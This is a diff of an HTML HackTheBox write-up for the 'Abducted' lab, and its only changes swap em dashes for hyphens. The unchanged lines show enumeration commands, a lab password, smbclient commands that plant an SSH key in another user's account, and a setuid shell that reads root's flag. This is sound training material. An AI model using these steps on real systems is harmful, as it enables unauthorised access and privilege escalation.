@@ -4,7 +4,7 @@
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
 <meta name="theme-color" content="#030305"/>
-<title>Abducted — HTB Write Up | pumkin</title>
+<title>Abducted - HTB Write Up | pumkin</title>
 <meta name="description" content="HackTheBox Abducted (Medium, Linux) full write up: Samba print command injection (CVE-2026-4480) → rclone password decode → force user symlink SSH key drop → polkit-delegated systemd service → root."/>
 <link rel="icon" href="../cat.png"/>
 <style>
@@ -95,7 +95,7 @@ h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-tran
       </ul>
 
       <h2>Enumeration</h2>
-      <p>Start enumeration with an Nmap scan. No web service is present — the host exposes <strong>SSH</strong> and a <strong>Samba</strong> server.</p>
+      <p>Start enumeration with an Nmap scan. No web service is present - the host exposes <strong>SSH</strong> and a <strong>Samba</strong> server.</p>
       <pre>nmap -sSVC --open -Pn 10.129.244.177</pre>
       <p><strong>Key ports:</strong></p>
       <ul>
@@ -105,7 +105,7 @@ h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-tran
       <pre>smbclient -L //10.129.244.177 -N</pre>
       <p><strong>Shares:</strong></p>
       <ul>
-        <li><strong>HP-Reception</strong> (Printer) — allows guest printing</li>
+        <li><strong>HP-Reception</strong> (Printer) - allows guest printing</li>
         <li><strong>projects</strong> (Disk)</li>
         <li><strong>transfer</strong> (Disk)</li>
         <li>IPC$</li>
@@ -113,7 +113,7 @@ h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-tran
       <pre>rpcclient -U "" -N 10.129.244.177 -c "srvinfo"</pre>
       <p>The server identifies as Ubuntu Linux. The exact Samba version is hard to pin remotely, but the presence of a guest-accessible printer share makes <strong>CVE-2026-4480</strong> the most likely vector.</p>
 
-      <h2>Foothold — CVE-2026-4480 (Print Command Injection)</h2>
+      <h2>Foothold - CVE-2026-4480 (Print Command Injection)</h2>
       <p>Samba's print command (when using <code>printing = sysv</code>) substitutes <code>%J</code> (job name) directly into a <code>system()</code> call without proper sanitization.</p>
       <p><strong>Exploit flow:</strong></p>
       <ol>
@@ -170,7 +170,7 @@ iXzvcib3SrpZ</pre>
       <pre>ssh scott@10.129.244.177
 scott@abducted:~$ cat user.txt</pre>
 
-      <h2>Privilege Escalation — scott → marcus</h2>
+      <h2>Privilege Escalation - scott → marcus</h2>
       <p>The <strong>transfer</strong> share has:</p>
       <ul>
         <li><code>force user = marcus</code></li>
@@ -190,7 +190,7 @@ scott@abducted:~$ smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
   -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'</pre>
       <pre>ssh -i /tmp/k marcus@10.129.244.177</pre>
 
-      <h2>Privilege Escalation — marcus → root</h2>
+      <h2>Privilege Escalation - marcus → root</h2>
       <p><strong>marcus</strong> is in the <code>operators</code> group, which has write access to:</p>
       <pre>marcus@abducted:~$ ls -ld /etc/systemd/system/smbd.service.d
 drwxrws--- 2 root operators ...</pre>
@@ -209,7 +209,7 @@ marcus@abducted:~$ /tmp/.rb -p -c 'id; cat /root/root.txt'</pre>
 
       <h2>Key Takeaways</h2>
       <ul>
-        <li><strong>Print subsystems are an RCE surface</strong> — unescaped job names passed to <code>system()</code> in the print command turn a spooler submission into command injection.</li>
+        <li><strong>Print subsystems are an RCE surface</strong> - unescaped job names passed to <code>system()</code> in the print command turn a spooler submission into command injection.</li>
         <li><strong>rclone's "obscured" passwords are reversible</strong> with the same tooling (<code>rclone reveal</code>); they are obfuscation, not encryption.</li>
         <li><strong>Samba <code>force user</code> + <code>wide links</code></strong> is a classic write primitive: a symlink lets a low-priv user write files as another user.</li>
         <li><strong>polkit-delegated systemd management</strong> + a writable drop-in directory == arbitrary root command execution via <code>ExecStartPre</code>.</li>
